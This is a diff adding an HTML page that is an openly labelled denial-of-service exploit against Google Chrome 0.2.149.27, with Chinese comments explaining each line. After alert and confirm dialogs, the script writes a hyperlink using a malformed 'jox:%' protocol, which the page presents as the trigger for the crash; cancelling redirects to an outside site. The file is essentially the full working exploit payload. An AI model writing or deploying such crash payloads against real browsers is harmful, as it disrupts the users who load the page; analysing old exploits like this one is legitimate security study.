@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Google Chrome DoS Exploit</title> <!-- 设置网页标题为 "Google Chrome DoS Exploit" -->
+  <script type="text/javascript">
+    // 弹出警告框，提示用户这是一个 Google Chrome 浏览器的 DoS 漏洞利用工具
+    alert("Google Chrome Browser 0.2.149.27 Denial of Service Exploit");
+
+    // 弹出确认对话框，询问用户是否要开始利用
+    var box = confirm("Press OK to start exploitation\nPress Cancel to skip exploitation");
+
+    // 判断用户点击确认或取消
+    if(box == true) {
+      // 如果用户点击 "OK"，则显示一个包含伪装链接的消息
+      document.write("Just point to the hyperlink... <a href=\"jox:%\"><strong>HERE</strong></a>");
+      // 这个链接的 `href` 属性使用了伪造的协议 `jox:%`，它实际上不会指向有效的资源
+    } else {
+      // 如果用户点击 "Cancel"，则显示另一个警告框，并重定向到 "http://www.zeroscience.org"
+      alert("Ok Dude!");
+      window.location.href = "http://www.zeroscience.org";
+    }
+  </script>
+</head>
+<body>
+  <!-- 页面内容为空，所有的功能都在脚本中完成 -->
+</body>
+</html>
